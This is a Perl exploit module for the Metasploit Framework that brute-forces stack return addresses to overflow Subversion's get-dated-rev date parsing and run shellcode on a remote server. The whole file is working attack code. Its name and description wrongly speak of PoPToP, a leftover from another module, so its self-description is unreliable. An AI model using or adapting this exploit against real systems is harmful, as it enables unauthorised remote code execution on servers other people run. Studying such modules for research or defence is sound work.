# Fri May 21 04:04:04 CDT 2004
package Msf::Exploit::subversion_date;
use strict;
use base 'Msf::Exploit';
use Pex::Struct;

my $advanced = {
  'StackTop'     => ['0xbffffafc', 'Start address for stack ret bruteforcing.'],
  'StackBottom'  => ['0x00000000', 'End address for stack ret bruteforcing.'],
  'StackStep'    => [0, 'Step size for ret bruteforcing, 0 for auto calculation.'],
  'BruteWait'    => [.4, 'Length in seconds to wait between brute force attempts'],
    # calculated at 228,  fudge to make more universal
  'RetLength'    => [100, 'Length of rets after payload'],
};

my $info = {
  'Name'    => 'PoPToP Negative Read Overflow',
  'Version'  => '$Revision$',
  'Authors' => [ 'spoonm <ninjatools [at] hush.com>', ],
  'Arch'    => [ 'x86' ],
  'OS'      => [ 'linux' ],
  'Priv'    => 1,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The poptop port', 3690],
      'URL'   => [1, 'DATA', 'URL', 'svn://localhost/home/spoonm/svn/repos'],
    },
  'Payload' =>
    {
      'Space'     => 2000 - 100, # We override this to do it dynamically
      'BadChars'  => "\x00 \t\n\r", # I didn't bother to look into this
#      'PrependEncoder'   => "\x81\xC4\xC0\xFB\xFF\xFF", # add esp,0xfffffbc0 (-1088)
      'MinNops'   => 16,
    },
  'Nop' =>
    {
      'BadRegs' => ['esp'],
    },
  'Description'  =>  
        'PoPToP Negative Read Buffer Overflow affecting '.
        'versions prior to 1.1.4-b3 and 1.1.3-20030409. '.
        'The daemon forks, so we can hit as many times as '.
        'we need to (And allowing very accurate brute forcing. '.
        'However, you can only hold 4 concurrent '.
        'processes or you won\'t hit anyore '.
        'until you free one. It does a fork() and then exec() so '.
        'so the stack should be pretty similar each attempt.'.
        'Note: Right now the vector we take does a close(sock) right before '.
        'we gain control, so you can\'t findsock.  There should be a way '.
        'to take a more complicated vector and avoid the close.',
  'Refs'  =>
    [
      'http://www.osvdb.org/3293',
      'http://securityfocus.com/archive/1/317995',
      'http://www.freewebs.com/blightninjas/',
    ],
  'DefaultTarget' => 0,
  'Targets' =>
    [
      ['Bruteforce', ''],
    ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

  return($self);
}

sub Exploit {
  my $self = shift;

  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');
  my $encodedPayload = $self->GetVar('EncodedPayload');
  my $shellcode   = $encodedPayload->Payload;


  my $retLength   = $self->GetLocal('RetLength');
  my $bruteWait   = $self->GetLocal('BruteWait');
  my $stackTop    = hex($self->GetLocal('StackTop'));
  my $stackBottom = hex($self->GetLocal('StackBottom'));
  my $stackStep   = $self->GetLocal('StackStep');
  my $url         = $self->GetVar('URL');

  $stackStep = $encodedPayload->NopsLength if($stackStep == 0);
  $stackStep -= $stackStep % 4;

  for(my $ret = $stackTop; $ret >= $stackBottom; $ret -= $stackStep) {
    my $sock = Msf::Socket->new();
    if(!$sock->Tcp($targetHost, $targetPort) || $sock->IsError) {
      $sock->PrintError;
      return;
    }

    $self->PrintLine(sprintf("Trying %#08x", $ret));
    my $evil = (pack('V', $ret) x int($retLength / 4)) . $shellcode;
#    my $evil = 'A' x 300;


my @data =  (
  '( 2 ( edit-pipeline ) ' . lengther($url) . ' ) ',
  '( ANONYMOUS ( 0: ) ) ',
  '( get-dated-rev ( ' .
#  lengther('Tue' . 'A' x $ARGV[0] . ' 3 Oct 2000 01:01:01.001 (day 277, dst 1, gmt_off -18000)') . ' ) ) '.
  lengther($evil . ' 3 Oct 2000 01:01:01.001 (day 277, dst 1, gmt_off)') . ' ) ) ',
 '',
);

  foreach my $data (@data) {
    my $dump = $sock->Recv(-1);
    $self->PrintDebugLine(3, "dump\n$dump");
    if(!$sock->Send($data)) {
      $self->PrintLine('Error in send.');
      $sock->PrintError;
    }
  }

    $self->Handler($sock);
    $sock->Close;
    select(undef, undef, undef, $bruteWait); # ghetto sleep
  }
  return;
}

sub lengther {
  my $data = shift;
  return(length($data) . ':' . $data);
}

1;
